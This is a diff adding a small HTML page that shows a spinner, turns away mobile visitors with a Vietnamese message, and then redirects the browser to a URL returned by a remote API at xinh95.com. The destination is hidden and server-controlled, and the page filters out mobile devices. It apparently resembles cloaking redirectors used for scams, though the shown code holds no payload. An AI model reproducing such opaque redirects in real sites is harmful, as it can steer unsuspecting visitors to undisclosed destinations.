@@ -1,0 +1,75 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body style="width: 100%;height: 100vh;display: flex;">
+    <h1 style="margin: auto;display: none;" id="alert"></h1>
+    <img src="https://loading.io/mod/spinner/default/index.svg" style="width:30%;height: auto;margin: auto;" id="loading">
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+
+const isUserUsingMobile = () => {
+
+// User agent string method
+let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+// Screen resolution method
+if (!isMobile) {
+    let screenWidth = window.screen.width;
+    let screenHeight = window.screen.height;
+    isMobile = (screenWidth < 768 || screenHeight < 768);
+}
+
+// Touch events method
+if (!isMobile) {
+    isMobile = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0));
+}
+
+// CSS media queries method
+if (!isMobile) {
+    let bodyElement = document.getElementsByTagName('body')[0];
+    isMobile = window.getComputedStyle(bodyElement).getPropertyValue('content').indexOf('mobile') !== -1;
+}
+
+return isMobile
+}
+
+    var screen = window.screen.width
+    if(screen < 600){
+        document.getElementById('loading').style.display = 'none'
+        document.getElementById('alert').style.display = 'block'
+        document.getElementById('alert').innerHTML = 'Vui lòng sử dụng máy tính để sử dụng website'
+    }else{
+        var tmp = isUserUsingMobile()
+        if(tmp == true){
+            document.getElementById('loading').style.display = 'none'
+            document.getElementById('alert').innerHTML = 'Vui lòng sử dụng máy tính để sử dụng website'
+        }
+    }
+    function fun_check(){
+        $.ajax({
+                url: "https://xinh95.com/api/get.php",
+                type: "GET",
+                contentType: "application/json",
+                dataType: "json",
+                data: JSON.stringify({
+                    
+                }),
+                error: function (xhr, ajaxOptions, thrownError) {
+                    alert('Lỗi kết nối tới máy chủ, vui lòng thử lại sau ít phút')
+                },
+                success: function (res) {
+                   if(res.status == 'true'){
+                    window.location = res.end
+                   }else{
+                    alert('Lỗi kết nối tới máy chủ, vui lòng thử lại sau ít phút')
+                   }
+                }
+            });
+    }
+    fun_check()
+</script>
+</html>
